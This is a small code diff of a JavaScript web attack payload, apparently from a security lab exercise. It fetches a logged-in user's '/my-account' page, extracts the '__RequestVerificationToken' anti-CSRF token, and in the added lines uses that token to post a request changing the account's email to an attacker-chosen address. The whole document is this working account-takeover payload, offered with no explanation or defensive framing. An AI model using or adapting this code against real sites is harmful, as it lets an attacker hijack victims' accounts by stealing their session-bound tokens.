@@ -4,7 +4,7 @@ req1.open('get', '/my-account', true);
 req1.withCredentials = true;
 req1.send('{}');
 function req1Listener() {
-    document.write(this.responseText);
+document.write(this.responseText);
 };
 
 req1.onreadystatechange = function()
@@ -16,8 +16,11 @@ req1.onreadystatechange = function()
         req2.open('get','/my-account',true);
         req2.send();
         function handleResponse() {
-            var token = document.getElementsByTagName("input")['__RequestVerificationToken'].value;
-            alert(token);
+        var token = document.getElementsByTagName("input")['__RequestVerificationToken'].value;
+        alert(token);
+        var changeEmail = new XMLHttpRequest();
+        changeEmail.open('post', '/my-account/change-email', true);
+        changeEmail.send('__RequestVerificationToken='+token+'&email=a@g.com')
         };
     }
 }
